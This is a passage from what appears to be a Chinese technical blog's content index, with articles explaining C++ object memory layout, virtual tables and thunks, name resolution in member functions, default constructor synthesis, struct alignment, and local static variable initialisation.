class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="4.png"></p><p><font color='green'><strong>考虑第一种情况，子类 C 没有重写基类中的任何虚函数</strong></font>，其内存布局如下图所示。看到这个内存布局，你一定有很多的疑问吧！像往常一样，编译器还是只为类 C 生成一个虚表，但是这个虚表的结构与上述单继承的情况也有所不同；在类 C 的对象内存模型中，还有<strong>两个虚表指针，</strong>这是因为类 C 不但继承自类 A，还继承自类 B，且这两个基类中都有虚函数。接下来分析在此种内存模型下，上述的第 22 行代码和第 23 代码中对 funcB 函数的调用。首先，对于第 22 行代码，将 class B 的指针指向 class C 的对象，由于 class B 是 class C 的父类，且其在 class C 中的子对象在 class A 子对象的下面，所以将 class C 对象的地址赋值给 class B 的指针时，需要进行<font color='red'> <strong>this 指针修正，这样 ptrB 实际上指向 &amp;objC + 16（16 = size A + 4 字节对齐）这个位置</strong></font>，也就是 vptrB 的地址，所以当通过 ptrB 调用虚函数 funcB 的时候，就好像 B 是 C 的单继承基类一样。其次，对于第 23 行代码，毋庸置疑 ptrC 就是指向 &amp;objC 这个位置，那么通过 ptrC 调用 funcB() 怎么样才能调用到呢？注意，class C 并没有重写 B::funcB 这个虚函数，所以 ptrC 肯定是无法通过 vptrA 调到 B::funcB 的，而编译器的处理就是<font color='red'><strong>隐式的将 ptrC 转换为 ptrB 指针</strong></font>，也就是通过类似 22 行的方式调用 funcB。对于这种情况，我们特意生成汇编代码如上图所示。</p><p><img src="5.png"></p><blockquote><p><strong>疑问一</strong>：在类 C 的虚表中有两个 C 的 typeinfo，还分别对应了两个 offset to this，这是有什么用呢？<br>答：<font color='red'><strong>typeinfo 字段和 offset to this 字段是用来支持 RTTI 机制的。</strong></font>我想即使是一位 C++ 新手也经常用到 dynamic_cast 类型转换运算符的吧，那有没有想过这个运算符的实现原理呢？其首先就是通过虚表指针找到 typeinfo 字段来对类型进行判定，如果判定成功则进行 this 指针修正（需要这种修正的原因就是由于多继承引起的），这就需要根据  offset to this 字段来做到了。假设我们有这种语句 <code>C *ptrC = dynamic_cast&lt;C *&gt;(ptrB); </code>，显然如果 ptrB 指向了一个 objC 的对象的话，这种类型转换是可以成功的，但通过上述对内存模型的分析我们可以知道，ptrB 如果指向 objC 的对象一定会发生 this 指针修正，那么 dynamic_cast 运算符肯定不能直接把 ptrB 的值赋值给 ptrC，而是要先进行修正，而到底修正多少呢？这就是 offset to this 的 值了，将 ptrB加上 offset to this 中的值，则得到了当前 objC 对象的真正地址。（<font color='blue'><strong>上述回答纯属推理虚构，我也没研究过这个运算符的源码，也没查看汇编代码，但我觉得我的推理应该是没毛病的，希望哪位好心的读者可以帮我验证，作者的时间真的太紧了呜呜呜呜！！！</strong></font>）</p><p><strong>疑问二</strong>：为啥在这个内存模型中有个 padding？<br>答：这就是内存对齐的问题了，由于指针占 8 个字节，int 型变量占 4 个字节，而 vptrB 作为指针，就需要八字节对其，所以必须加上 4 个字节来进行对齐。（还记得 C 语言结构体对齐中提到的<strong>基础数据类型的起始地址必须是其大小的整数倍</strong>吗 - -!）</p></blockquote><p><font color='green'><strong>考虑第二种情况，子类 C 重写基类 B 中的虚函数 funcB，将第 15 行代码的注释符去掉。</strong></font>内存布局如下图所示，我们发现 objC 的内存模型和第一种情况完全没有区别，但是类 C 的虚表却有了些许变化，主要是在类 C 中对函数 funcB 重写后，C::funcB 的地址放到了 A::funcA 下面，这里不是类 A 的地盘子吗？什么意思？OK，我们稍后再来算账，还有一个变化，vptrB 指向的第一个虚表项变成了 thunk to C::funcB，这又是个什么玩意？</p><p>首先我们来考虑为什么上图没有重写虚函数的内存模型在类 C 重写了 funcB 虚函数就失效了。假设还是上图中的那种内存模型，然后用重载的 C::funcB 来替代 B::funcB，那我们调用第 23 行代码的时候会发生什么？将 ptrC 隐式转换成 ptrB 后才能调用到 C::funcB 是吧，但是这时候又要传入 ptrB 这个 this 指针作为其参数，这合理吗？这不合理，因为我类 C 既然重载了 funcB，那 C::funcB 肯定要接受一个 C* 类型的 this 指针嘛，给我一个 B* 类型的算什么嘛。所以既然类 C 重载了 funcB，那这个函数对于类 A 来说，就好像类 C 定义了一个新的 funcB 虚函数，那我加到类 A 虚表的底下不是更合理吗，这样第 23 行的代码就可以直接通过 vptrA 来找到 C::funcB，并且传入 ptrC 作为合理的 this 指针了。妙哉！</p><p><img src="7.png"></p><p>把 C::funcB 放到 A::funA 下面确实有了正当的理由，但这又引入了新的问题，对于第 22 行代码，通过 ptrB 调用 C::funcB 应该怎么办呢？这就是 thunk to C::funcB(void) 的作用了，它仅仅作了两件很简单的事情，<strong>修正 this 指针</strong>和<strong>跳转到 C::funcB 的定义</strong>处。这样，如果 ptrB 确实是指向了 objC 对象，那么其就会根据类 C 的虚表执行 C::funcB，且将 ptrB 指针修正为 objC 对象的真正地址。我们可以看到 thunk 的汇编代码，如下图所示。</p><p><img src="6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 面向对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类成员函数在何时决议</title>
      <link href="/2022/03/31/underlyingPrinciple-member-function-resolve/"/>
      <url>/2022/03/31/underlyingPrinciple-member-function-resolve/</url>
      
        <content type="html"><![CDATA[<blockquote><p>先说结论：编译器在解析类的声明的时候，在遇到类成员函数时会对其函数签名进行决议（因为有了函数签名就可以匹配函数调用操作），而在整个类的声明都解析完成之后才对成员函数体内的符号进行决议。</p></blockquote><p>根据上面这句话，理解编译器处理下述代码时候的行为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> length;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> val = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> par = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(length a, <span class="keyword">int</span> b = par)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> val; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">float</span> length;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> par = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>思考，对于上述代码，成员函数 func 中：</p><ul><li>length 会是什么类型呢，是第一行的 int 类型还是第 11 行的 float 类型呢？</li><li>默认参数 par 是用全局变量中的 par 来决议还是类 A 中的静态成员 par 来决议呢？</li><li>函数体中的 val 是用全局变量中的 val 来决议还是类 A 中的成员变量 val 来决议呢？</li></ul></blockquote><p><img src="1.png"></p><ul><li><strong>length 被编译器解析为 int 类型</strong>，这是因为编译器在解析类声明的时候遇到了成员函数 func，而函数的形参类型属于函数签名的一部分，且编译器还没有解析到类 A 中内部的 type 声明，所以将 length 解析为 int 类型。</li><li><strong>默认形参 par 和函数内符号 val 均分别被解析为类中的静态成员和成员变量</strong>，这是因为它们不属于函数签名的部分，所以在整个类的声明被解析完后才进行决议。</li></ul><p><strong>总结：受上述示例启发，我们在以后的编程过程中可以采取一种防御性的编程风格，即将类里面的 type 声明都放在类的起始处，防止出现意料之外的结果。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 面向对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译器什么时候合成默认构造函数</title>
      <link href="/2022/03/31/underlyingPrinciple-default-construt-timing/"/>
      <url>/2022/03/31/underlyingPrinciple-default-construt-timing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>C++ 新手一般有两个常见的误解：</p><ol><li>任何类如果没有定义默认构造函数，则会被合成出一个来。</li><li>编译器合成出来的默认构造函数会显式的设定类中每一个数据成员的默认值。</li></ol><p><strong>正确答案：</strong>如果一个类没有任何构造函数，而且<strong>编译器需要</strong>其默认构造函数的时候，则会为其合成默认构造函数。一般来说，有四种情况是所谓的 “编译器需要默认构造函数”，分别是：</p><ul><li>类的所有成员变量中包括带有默认构造函数的类对象。</li><li>类派生自一个带有默认构造函数的基类。</li><li>类中包含虚函数。</li><li>类派生自虚基类。</li></ul></blockquote><p>如何理解上述所说的<strong>编译器需要</strong>呢？首先明白一点，所谓构造函数是用来初始化类对象的内存空间的，所以我们仅仅需要将编译器需要理解为需要对类对象的内存空间进行初始化，这将导致编译器不得不合成默认构造函数。</p><p>编译器要合成默认构造函数有两个前提：</p><ul><li><strong>一个 class 没有任何的构造函数。</strong></li><li><strong>编译器确实需要默认构造函数。</strong></li></ul><p>那问题来了，什么时候编译器确实需要默认构造函数呢？考虑如下代码片段：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    Foo *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Foo foo;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 main 函数中定义了一个 Foo 的对象 foo，这时候会生成默认构造函数吗？答案是<strong>不会</strong>！因为类 Foo 的成员都是基础类型，所以编译器要做的仅仅是为 foo 对象开辟一块栈空间而已，至于怎么处理其栈空间内的值，那就是由程序员自己来保证的了！！</p><p>编译器确实需要默认构造函数的情况有四种：</p><p><strong>一、当一个类没有任何构造函数，但它含有一个成员对象，而该成员对象有默认构造函数的时候。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>() : <span class="built_in">val</span>(<span class="number">1</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    Foo *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Foo foo;</span><br><span class="line">    <span class="keyword">char</span> *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Bar bar;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1.png"></p><p>由于 main 函数在初始化 bar 对象的时候，需要对其成员 foo 进行默认初始化，所以必须调用类 Foo 的默认构造函数，所以这会导致编译器为 Bar 合成默认构造函数，用来调用类 Foo 的默认构造函数，如上图所示。 </p><p><strong>二、 当一个没有任何构造函数的类派生自一个带有默认构造函数的基类的时候。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Foo</span>() : <span class="built_in">val</span>(<span class="number">1</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    Foo *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> :</span> <span class="keyword">public</span> Foo &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *bnext;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Bar bar;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="2.png"></p><p>同理，由于 main 函数在初始化 bar 对象的时候需要先调用基类的默认构造函数，所以编译器会为 Bar 合成默认构造函数，用来调用 Foo 的默认构造函数。如上图所示。</p><p><strong>三、当一个类没有任何构造函数，但是带有虚函数的时候。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Widget</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">flip</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bell</span> :</span> <span class="keyword">public</span> Widget &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">flip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        times++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> times;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Bell b;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="3.png"></p><p>在有虚表的类中，其对象需要一个位置来保存其虚表的地址，这个位置就被称为虚表指针，所以带有虚函数的类在声明其对象的时候必须将这个位置上值初始化为其虚表的地址，而这个操作必须由构造函数完成。由于 Bell 类是有虚表的，所以必须合成默认构造函数来对其虚表指针进行初始化，如上图的红框内所示。</p><p><strong>四、当一个没有任何构造函数的类的继承链中存在虚继承时。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Derived d;</span><br><span class="line">    d.i = <span class="number">1</span>;</span><br><span class="line">    d.j = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="4.png"></p><p>在 Derived 虚继承了 Base 类后，编译器则为 Derived 类合成了默认构造函数，主要是为了初始化 VVT 指针，类似于虚表指针，VTT 指针则指向 VTT（<strong>virtual table table</strong>）。至于为什么虚继承的类需要一个 VTT 指针呢？其实此例子并不能看出个所以然，该情况涉及到虚继承的实现机制，请查阅深入理解对象内存模型中的解释。</p><blockquote><p>在本文中提到的虚表，虚表指针，VTT 等概念涉及到了编译器对类对象内存模型的实现，较为复杂，请参考本系列中专门介绍对象内存模型的文章！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 面向对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存对齐</title>
      <link href="/2022/03/31/underlyingPrinciple-memory-algin/"/>
      <url>/2022/03/31/underlyingPrinciple-memory-algin/</url>
      
        <content type="html"><![CDATA[<p>C/C++ 语言中的结构体的内存对齐由一组规则决定：</p><blockquote><p>对齐系数：由特定平台的编译器决定，可以通过 #pragma pack(n) 来定义。在 gcc 编译器中，n 的默认大小为 4。<br>有效对齐值：由结构体中内存最大的数据类型和对齐系数两者之间较小的决定。</p></blockquote><p><strong>成员在结构体中的偏移值</strong>：第一个成员为 0，后续成员的偏移值等于该成员大小和有效对齐值中较小的那个的整数倍。<br><strong>结构体总大小</strong>：有效对齐值的整数倍。 </p><p>根据以上的对齐规则，就可以得出如下 C++ 语言代码中结构体大小：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> i;    </span><br><span class="line">    <span class="keyword">char</span> c1;  </span><br><span class="line">    <span class="keyword">char</span> c2;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S2</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> c1;  </span><br><span class="line">    <span class="keyword">int</span> i;    </span><br><span class="line">    <span class="keyword">char</span> c2;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S3</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> c1;  </span><br><span class="line">    <span class="keyword">char</span> c2; </span><br><span class="line">    <span class="keyword">int</span> i;    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(2)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S4</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> i;    </span><br><span class="line">    <span class="keyword">char</span> c1;  </span><br><span class="line">    <span class="keyword">char</span> c2;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S5</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> c1;  </span><br><span class="line">    <span class="keyword">int</span> i;    </span><br><span class="line">    <span class="keyword">char</span> c2;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S6</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> c1;  </span><br><span class="line">    <span class="keyword">char</span> c2; </span><br><span class="line">    <span class="keyword">int</span> i;    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The size of S1: %d\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(S1));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The size of S2: %d\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(S2));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The size of S3: %d\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(S3));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The size of S4: %d\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(S4));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The size of S5: %d\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(S5));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The size of S6: %d\n&quot;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(S6));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>The size of S1: 8（4+1+1+2）              <strong>对齐系数：4             有效对齐值：4</strong></p><p>The size of S2: 12（1+3+4+1+3）       <strong>对齐系数：4             有效对齐值：4</strong></p><p>The size of S3: 8（1+1+2+4）             <strong>对齐系数：4              有效对齐值：4</strong></p><p>The size of S4: 6（4+1+1）                 <strong>对齐系数：2              有效对齐值：2</strong></p><p>The size of S5: 8（1+1+4+1+1）         <strong>对齐系数：2              有效对齐值：2</strong></p><p>The size of S6: 6（1+1+4）                 <strong>对齐系数：2              有效对齐值：2</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 底层原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> 底层技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解局部静态变量底层实现</title>
      <link href="/2022/03/31/underlyingPrinciple-local-static-var/"/>
      <url>/2022/03/31/underlyingPrinciple-local-static-var/</url>
      
        <content type="html"><![CDATA[<p>局部静态变量在什么地方进行初始化是一个老生常谈的问题，在很多博客、教科书上都会说局部静态变量是在<strong>第一次调用其所在函数且运行到其所在语句的时候</strong>被初始化的，真的是这样吗？</p><p>我们通过如下代码进行我们的实验：</p><blockquote><p>实验环境：</p><ol><li><strong>Ubuntu 18.04</strong></li><li><strong>g++ 7.5.0</strong></li><li><strong>IDA 7.5.0</strong></li></ol></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> globleVar = <span class="number">0x7FFFFFFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> localStaticVar = <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">localStaticVar += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> localStaticVar = a;</span><br><span class="line">localStaticVar += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func3</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> localStaticVar = globleVar;</span><br><span class="line">localStaticVar += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> localStaticVar;</span><br><span class="line">localStaticVar += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line"><span class="built_in">func1</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">func2</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">func3</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">func4</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下图所示，func1 函数的源代码中用<strong>常量值（Literal）</strong>对局部静态变量进行初始化，而在生成的汇编代码中却没有任何对其局部静态变量初始化的代码，在对其进行加一操作的时候，直接对局部静态变量所在的 .data 段中的内存空间的值进行操作，而类似于全局变量，.data 段中的数据都是在<font color='red'><strong>程序装载到内存后，执行 main 函数之前</strong></font>进行初始化的。</p><p><img src="1.png">                        </p><p>如下图所示，func2 函数在源代码中用其参数对局部静态变量进行初始化，所生成的汇编代码就相对很复杂了。为了判断局部静态变量是否已经被初始化过了，需要先去读取一个 guard 变量（绿框内），如果该变量不为 0，则表明局部静态变量已经初始化过了。如果该变量为 0，则表明局部静态变量还没有进行初始化，这时候调用函数 <strong>___cxa_guard_acquire</strong> 获得锁，这是由于 C++11 标准中要求局部静态变量的初始化必须是线程安全的，所以在初始化其之前需要给其上锁，然后再对其初始化。在初始化局部静态变量之后，调用函数 <strong>___cxa_guard_release</strong> ，同时将 guard 变量的地址作为参数传入该函数，可见 guard 变量会在这个函数中被修改为非零值，表示局部静态变量已经被初始化。</p><blockquote><p>注意，guard 变量和局部静态变量都存放在了 .bss 段中，所以他们的初始值都是 0。</p></blockquote><p><img src="2.png">    </p><p>如下图所示，func3 函数的实现也是类似于 func1 函数，因为全局的 const var 具有常量属性，在编译期就已经可以确定值，所以 func3 函数中的局部静态变量也直接存放在 .data 段，在 main 函数之前进行初始化。</p><p><img src="3.png">    </p><p>如下图所示，func4 函数中对于局部静态变量的处理好像完全跟 func3 函数一样，但其实还是有细微区别，因为其局部静态变量没有初值，所以被放在了 .bss 段中，<strong>默认被初始化为 0</strong>。</p><p><img 